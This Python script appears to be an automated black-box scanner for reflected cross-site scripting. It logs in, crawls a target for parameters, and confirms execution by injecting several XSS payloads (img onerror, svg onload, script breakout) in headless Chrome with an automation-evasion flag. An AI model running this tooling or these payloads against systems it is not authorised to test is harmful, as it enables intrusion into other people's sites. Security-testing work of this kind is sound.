#!/usr/bin/env python3
"""xss_harness.py - blind reflected-XSS discovery + execution-proof confirm (black-box).

Same discipline as idor/sqli harnesses: discover candidate (url, param) pairs (authed
crawl + a param-name wordlist), run a CHEAP reflection pre-screen (does the param echo
into the response at all?), and only CONFIRM the survivors. Confirm is an execution
oracle: inject JS that console.log()s a unique marker, load the URL in headless Chrome,
and a finding is proven ONLY if the browser actually EXECUTES our script (the marker
fires on the console). Reflection alone is a lead; execution is the proof. Self-contained
- no OOB/interactsh/network dependency, so it's reliable against a localhost target.
"""
from __future__ import annotations
import sys, re, json, time, uuid, http.cookiejar, urllib.request, urllib.parse, urllib.error, pathlib
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl
from html.parser import HTMLParser
from playwright.sync_api import sync_playwright

import os
BASE = os.environ.get("NABLUS_TARGET", "http://127.0.0.1:8099").rstrip("/")
# NABLUS_SEEDS: comma-separated "url?param" entries to force into the candidate set,
# for JS/RSC apps a blind HTML crawl can't discover (e.g. /login/?next=, /search?q=).
SEEDS = [s.strip() for s in os.environ.get("NABLUS_SEEDS", "").split(",") if s.strip()]
CREDS = {"alice": "Sunflower#A1pha"}
OUT = r"C:\Users\Laith\nabulus-agent\xss_findings.json"
PACE = 0.02
MAX_PRESCREEN = 300
MAX_CONFIRM = 8
PARAM_NAMES = ["q", "search", "query", "s", "name", "term", "keyword", "msg", "message",
               "comment", "title", "text", "input", "redirect", "url", "next", "lang",
               "page", "id", "tag", "ref", "callback", "return"]


def login(user, pw):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    try:
        op.open(BASE + "/login", data=urlencode({"username": user, "password": pw}).encode(), timeout=10)
    except Exception:
        pass
    return "; ".join(f"{c.name}={c.value}" for c in cj)


def get(url, cookie):
    if PACE:
        time.sleep(PACE)
    r = urllib.request.Request(url, headers={"Cookie": cookie})
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return int(resp.status), resp.read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return int(e.code), (e.read(200000).decode("utf-8", "replace") if e.fp else "")
    except Exception:
        return 0, ""


class _Links(HTMLParser):
    def __init__(self):
        super().__init__(); self.hrefs = []; self.forms = []; self._cur = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "a" and a.get("href"):
            self.hrefs.append(a["href"])
        if tag == "form":
            self._cur = {"action": a.get("action", ""), "method": (a.get("method") or "get").lower(), "names": []}
        if tag in ("input", "select", "textarea") and self._cur is not None and a.get("name"):
            self._cur["names"].append(a["name"])
    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur); self._cur = None


def candidates(cookie):
    seen_u, frontier, stems, cands = set(), [BASE + "/"], set(), set()
    for _ in range(2):
        nxt = []
        for u in frontier:
            if u in seen_u or len(seen_u) >= 15:
                continue
            seen_u.add(u)
            st, body = get(u, cookie)
            if st != 200:
                continue
            pr = urlparse(u)
            stems.add(f"{pr.scheme}://{pr.netloc}{pr.path}")
            for k, _v in parse_qsl(pr.query):
                cands.add((f"{pr.scheme}://{pr.netloc}{pr.path}", k))
            p = _Links()
            try:
                p.feed(body)
            except Exception:
                pass
            for h in p.hrefs:
                link = urljoin(u, h).split("#")[0]
                if link.startswith(BASE) and link not in seen_u and "logout" not in link.lower():
                    nxt.append(link)
            for f in p.forms:
                base = urljoin(u, f["action"]).split("#")[0]
                stems.add(base)
                for n in f["names"]:
                    if n and n.lower() not in ("username", "password"):
                        cands.add((base, n))
        frontier = nxt
    # param-name wordlist over every stem we saw (+ root)
    for stem in stems | {BASE + "/search", BASE + "/"}:
        for pn in PARAM_NAMES:
            cands.add((stem, pn))
    # explicit seeds (known param endpoints an RSC/SPA crawl can't find)
    for s in SEEDS:
        pr = urlparse(s if "://" in s else BASE + ("" if s.startswith("/") else "/") + s)
        base = f"{pr.scheme}://{pr.netloc}{pr.path}"
        qs = parse_qsl(pr.query)
        if qs:
            for k, _v in qs:
                cands.add((base, k))
        else:
            for pn in PARAM_NAMES:
                cands.add((base, pn))
    return sorted(cands)


def reflects(url, param, cookie):
    """Cheap pre-screen: does the param echo back into the response unmodified?"""
    marker = "zq" + uuid.uuid4().hex[:8]
    u = f"{url}?{urlencode({param: marker})}"
    st, body = get(u, cookie)
    return (st == 200 and marker in body), u


def _payloads(m):
    j = f"console.log('{m}')"
    return [
        f"<img src=x onerror={j}>",
        f'"><img src=x onerror={j}>',
        f"<svg onload={j}>",
        f"'><svg onload={j}>",
        f"</script><script>{j}</script>",
    ]


def confirm(reflecting, cookie):
    """Execution oracle: load each reflecting candidate with a marker-logging payload in
    headless Chrome; confirm ONLY if the browser executes it (console marker fires)."""
    findings = []
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True, channel="chrome",
                                     args=["--disable-blink-features=AutomationControlled"])
        ctx = browser.new_context(ignore_https_errors=True)
        if cookie:
            ctx.set_extra_http_headers({"Cookie": cookie})
        page = ctx.new_page()
        hits = set()
        page.on("console", lambda m: [hits.add(k) for k in list(PENDING) if k in (m.text or "")])
        page.on("dialog", lambda d: d.dismiss())
        global PENDING
        for base, param in reflecting:
            done = False
            for pl in _payloads("MARK"):
                marker = "x" + uuid.uuid4().hex[:10]
                PENDING = {marker}
                payload = pl.replace("MARK", marker)
                u = f"{base}?{urlencode({param: payload})}"
                try:
                    page.goto(u, wait_until="networkidle", timeout=9000)
                    page.wait_for_timeout(350)
                except Exception:
                    pass
                if marker in hits:
                    findings.append({"class": "xss", "subtype": "reflected", "severity": "high",
                                     "endpoint": base, "param": param,
                                     "proof_request": f"GET {u}",
                                     "validated_by": "headless Chrome executed injected JS (console marker fired)",
                                     "confirmed": True})
                    print(f"[xss] CONFIRMED reflected XSS: {urlparse(base).path}?{param}=  (payload: {pl[:28]}...)")
                    done = True
                    break
            if done and len(findings) >= MAX_CONFIRM:
                break
        browser.close()
    return findings


PENDING = set()


def main():
    cookie = login("alice", CREDS["alice"])
    cands = candidates(cookie)
    reflecting = []
    for base, param in cands[:MAX_PRESCREEN]:
        ok, _u = reflects(base, param, cookie)
        if ok:
            reflecting.append((base, param))
    # dedup (stem,param)
    reflecting = sorted(set(reflecting))
    print(f"login: {'yes' if cookie else 'NO'} | candidates: {len(cands)} | reflecting: {len(reflecting)}")
    for b, p in reflecting[:12]:
        print(f"  reflects: {urlparse(b).path}?{p}=")

    findings = confirm(reflecting, cookie)
    pathlib.Path(OUT).write_text(json.dumps(findings, indent=2), encoding="utf-8")
    print(f"[xss] confirmed reflected-XSS findings: {sum(1 for f in findings if f['confirmed'])} -> {OUT}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
